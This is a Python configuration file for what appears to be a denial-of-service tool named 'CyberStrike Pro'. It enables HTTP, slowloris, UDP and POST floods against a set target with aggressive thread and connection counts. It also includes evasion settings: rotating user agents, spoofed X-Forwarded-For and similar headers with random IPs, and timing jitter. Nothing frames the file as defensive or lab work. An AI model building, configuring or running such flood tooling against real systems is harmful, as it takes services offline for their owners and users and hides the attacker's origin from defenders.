"""
Default configuration settings for CyberStrike Pro
"""
import random
import string

DEFAULT_CONFIG = {
    "target": {
        "ip": "192.168.127.129",
        "port": 80,
        "uri": "/"
    },
    "attacks": {
        "http_flood": {
            "enabled": True,
            "threads": 100,
            "delay": 0.001
        },
        "slowloris": {
            "enabled": True,
            "connections": 500,
            "keep_alive_interval": 5
        },
        "udp_flood": {
            "enabled": True,
            "threads": 50,
            "packet_size": 1024
        },
        "post_flood": {
            "enabled": True,
            "threads": 30,
            "data_size": 10240
        }
    },
    "evasion": {
        "random_user_agents": True,
        "spoof_headers": True,
        "jitter": [0.001, 0.05]
    },
    "logging": {
        "log_file": "DDOS_Attack_AGGRESSIVE.log",
        "live_stats_interval": 2
    }
}

# User Agents Database
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "curl/8.0.1",
    "Python-urllib/3.10"
]

# Spoof Headers for evasion
SPOOF_HEADERS = [
    "X-Forwarded-For: {}.{}.{}.{}".format(random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)),
    "X-Real-IP: {}.{}.{}.{}".format(random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)),
    "X-Client-IP: {}.{}.{}.{}".format(random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)),
    "Referer: https://www.google.com/search?q=" + ''.join(random.choices(string.ascii_lowercase, k=10)),
    "Accept-Encoding: gzip, deflate, br",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.9",
    "Cache-Control: no-cache",
    "DNT: 1",
    "Upgrade-Insecure-Requests: 1"
]

CONFIG_FILE = "config_aggressive.json"